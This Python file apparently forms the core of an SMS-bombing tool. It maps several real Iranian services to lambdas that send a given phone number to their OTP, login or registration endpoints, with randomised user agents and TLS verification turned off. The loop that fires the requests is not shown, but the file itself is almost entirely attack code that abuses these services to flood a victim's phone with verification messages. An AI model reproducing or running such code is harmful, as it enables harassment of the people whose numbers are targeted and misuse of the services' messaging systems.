from requests import post, get
from user_agent import generate_user_agent
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVICES = {
    'bit24': lambda num: post(
        url='https://bit24.cash/auth/bit24/api/v3/auth/check-mobile',
        json={"mobile": f'0{num}', "country_code": "98"},
        headers={"User-Agent": generate_user_agent()},
        verify=False,
        timeout=10
    ),
    
    'drdr': lambda num: post(
        url="https://drdr.ir/api/v3/auth/login/mobile/init",
        json={"mobile": num},
        headers={"User-Agent": generate_user_agent()},
        verify=False,
        timeout=10
    ),
    
    'drto': lambda num: get(
        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        params={"mobile": num, "captcha": "", "country_id": 205},
        headers={"User-Agent": generate_user_agent()},
        verify=False,
        timeout=10
    ),
    
    'banimod': lambda num: post(
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f'0{num}'},
        headers={"User-Agent": generate_user_agent()},
        verify=False,
        timeout=10
    ),
    
    'beroozmarket': lambda num: post(
        url="https://api.beroozmart.com/api/pub/account/send-otp",
        json={"mobile": f'0{num}', "sendViaSms": True, "email": "null", "sendViaEmail": False},
        headers={"User-Agent": generate_user_agent()},
        verify=False,
        timeout=10
    )
}
